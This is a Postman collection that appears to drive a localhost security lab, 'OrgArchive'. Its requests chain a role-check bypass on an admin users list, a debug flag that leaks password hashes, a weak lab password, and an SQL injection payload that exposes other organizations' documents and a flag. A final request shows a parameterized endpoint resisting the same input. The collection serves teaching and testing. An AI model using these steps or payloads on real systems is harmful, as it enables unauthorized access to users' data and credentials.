{
  "info": {
    "name": "OrgArchive — signup to cross-organization document access",
    "description": "Run the 9 requests in order. Sign up as a normal user, use CVE 1 to read the admin-only users list, then search documents as Anna. Anna’s weak lab password is already set in annaPassword.",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "variable": [
    {
      "key": "baseUrl",
      "value": "http://localhost:8080"
    },
    {
      "key": "username",
      "value": ""
    },
    {
      "key": "password",
      "value": ""
    },
    {
      "key": "annaPassword",
      "value": "sunshine"
    }
  ],
  "item": [
    {
      "name": "1 · Discover endpoints in OpenAPI",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/v3/api-docs",
        "description": "The service publishes an OpenAPI specification with paths, methods, and documented authentication. Knowing an endpoint does not grant access to it.",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const api = pm.response.json();",
              "pm.expect(api.info.title).to.equal('OrgArchive API');",
              "['/signup','/users','/users/{id}','/organizations','/organizations/{id}','/documents/search','/documents/search-safe','/documents/search-debug'].forEach(path => pm.expect(api.paths).to.have.property(path));",
              "pm.expect(api.paths['/signup']).to.have.property('post');",
              "pm.expect(api.paths['/users']).to.have.property('get');",
              "pm.expect(api.paths['/documents/search']).to.have.property('post');"
            ]
          }
        }
      ]
    },
    {
      "name": "2 · Anonymous /users → 401",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/users",
        "description": "",
        "auth": {
          "type": "noauth"
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(401);"
            ]
          }
        }
      ]
    },
    {
      "name": "3 · Sign up as a normal user",
      "request": {
        "method": "POST",
        "url": "{{baseUrl}}/signup",
        "description": "",
        "auth": {
          "type": "noauth"
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"username\": \"{{username}}\",\n  \"displayName\": \"Demo User\",\n  \"email\": \"{{username}}@example.test\",\n  \"password\": \"{{password}}\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "prerequest",
          "script": {
            "type": "text/javascript",
            "exec": [
              "const suffix = Math.random().toString(36).slice(2, 10);",
              "pm.collectionVariables.set('username', 'user-' + suffix);",
              "pm.collectionVariables.set('password', 'UserPass!' + suffix + '9');"
            ]
          }
        },
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(201);",
              "const account = pm.response.json();",
              "pm.expect(account.username).to.equal(pm.collectionVariables.get('username'));",
              "pm.expect(account).not.to.have.property('organizationUuid');"
            ]
          }
        }
      ]
    },
    {
      "name": "4 · My organization documents → empty",
      "request": {
        "method": "POST",
        "url": "{{baseUrl}}/documents/search",
        "description": "The server determines our organization from the authenticated account. A new organization has no documents.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{username}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{password}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    },
    {
      "name": "5 · CVE 1 · Normal user accesses admin /users",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/users",
        "description": "First unauthorized access: the newly registered USER receives the admin-only user list because CVE-2025-22223 skips the inherited role check.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{username}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{password}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const users = pm.response.json();",
              "pm.expect(users).to.be.an('array');",
              "pm.expect(users.length).to.be.above(0);",
              "pm.expect(users.some(u => u.username === 'anna')).to.be.true;",
              "pm.expect(users.some(u => u.role === 'admin')).to.be.true;",
              "pm.expect(users.every(u => !('organizationUuid' in u))).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "6 · Users with debug flag → password hashes",
      "request": {
        "method": "GET",
        "url": "{{baseUrl}}/users?debug=true",
        "description": "The debug=true flag exposes BCrypt hashes for every user. Anna’s weak password is already stored in the collection variable annaPassword for the next requests.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "{{username}}",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{password}}",
              "type": "string"
            }
          ]
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const users = pm.response.json();",
              "pm.expect(users.length).to.be.above(1);",
              "users.forEach(u => pm.expect(u.passwordHash).to.match(/^\\$2[aby]\\$/));",
              "pm.expect(users.every(u => !('organizationUuid' in u))).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "7 · Anna searches her report documents",
      "request": {
        "method": "POST",
        "url": "{{baseUrl}}/documents/search",
        "description": "Anna sees only report documents from her own organization. No organization UUID is sent.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"category\": \"report\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const docs = pm.response.json();",
              "pm.expect(docs).to.be.an('array').that.is.not.empty;",
              "const organizations = new Set(docs.map(d => JSON.parse(d.metadata).organizationUuid));",
              "pm.expect(organizations.size).to.equal(1);",
              "pm.expect(docs.every(d => JSON.parse(d.metadata).category === 'report')).to.be.true;"
            ]
          }
        }
      ]
    },
    {
      "name": "8 · CVE 2 · SQL injection reveals other organizations",
      "request": {
        "method": "POST",
        "url": "{{baseUrl}}/documents/search",
        "description": "The category metadata filter contains an SQL payload. Anna’s organization is still loaded from her account, but the generated filter bypasses that condition.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"category\": \"report' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "const docs = pm.response.json();",
              "const organizations = new Set(docs.map(d => JSON.parse(d.metadata).organizationUuid));",
              "pm.expect(organizations.size).to.be.at.least(5);",
              "pm.expect(pm.response.text()).to.include('FLAG{archive-isolation-broken-by-converter}');"
            ]
          }
        }
      ]
    },
    {
      "name": "9 · Safe search with the same input → empty",
      "request": {
        "method": "POST",
        "url": "{{baseUrl}}/documents/search-safe",
        "description": "The same category is bound as data, so it cannot alter the SQL query.",
        "auth": {
          "type": "basic",
          "basic": [
            {
              "key": "username",
              "value": "anna",
              "type": "string"
            },
            {
              "key": "password",
              "value": "{{annaPassword}}",
              "type": "string"
            }
          ]
        },
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"category\": \"report' OR '1'='1\"\n}",
          "options": {
            "raw": {
              "language": "json"
            }
          }
        }
      },
      "event": [
        {
          "listen": "test",
          "script": {
            "type": "text/javascript",
            "exec": [
              "pm.response.to.have.status(200);",
              "pm.expect(pm.response.json()).to.be.an('array').that.is.empty;"
            ]
          }
        }
      ]
    }
  ]
}
